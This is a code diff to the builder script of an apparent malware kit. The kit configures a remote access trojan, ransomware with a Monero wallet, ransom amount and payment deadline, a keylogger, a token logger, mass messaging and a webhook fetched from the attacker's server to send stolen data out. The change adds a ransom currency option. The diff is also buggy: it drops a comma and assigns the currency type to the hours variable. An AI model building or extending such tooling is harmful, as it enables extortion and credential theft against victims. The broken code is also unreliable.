@@ -46,7 +46,7 @@ class Main:
             return target == 'y'
 
     def compile(self, config):
-        rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin = config
+        rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, crypto_type, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin = config
         key = {
             "SERVER_CLIENT": rat_client,
             "HOSTNAME": f'O0O000OOO00O0OOO0("{server_addr}").decode()',
@@ -57,6 +57,7 @@ class Main:
             "HOURS": hours,
             "MONERO_WALLET": wallet,
             "CRYPTO_AMOUNT": cost,
+            "CRYPTO_TYPE": crypto_type
             "WEBHOOK": webhook if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
             "TOKEN_LOGGER": token_logger,
             "NUKE_TOKEN": auto_nuke,
@@ -252,6 +253,7 @@ class Main:
                 hours = config['RANSOMWARE'][1]['PAYMENT_TIMELIMIT_IN_HOURS']
                 wallet = config['RANSOMWARE'][1]['WALLET']
                 cost = config['RANSOMWARE'][1]['RANSOM_AMOUNT']
+                hours = config['RANSOMWARE'][1]['CRYPTO_CURRENCY_TYPE']
 
             token_logger = config['TOKEN_LOGGER'][0]
             if token_logger:
@@ -309,6 +311,9 @@ class Main:
                 print(color("Enter cost to retrieve files: "), end="")
                 cost = input("> ")
 
+                print(color("Enter Crypto Currency type: "), end="")
+                crypto_type = input("> ")
+
             token_logger = self.get_answer(color("Enable Token Logging (Y or N): ")+"> ")
 
             if token_logger:
@@ -331,7 +336,7 @@ class Main:
 
         # self.server_convert = self.get_answer(color("Compile via CloudConvert? (Y or N): ")+"> ")
 
-        return rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin
+        return rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, crypto_type, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin
             
 
 if __name__ == "__main__":
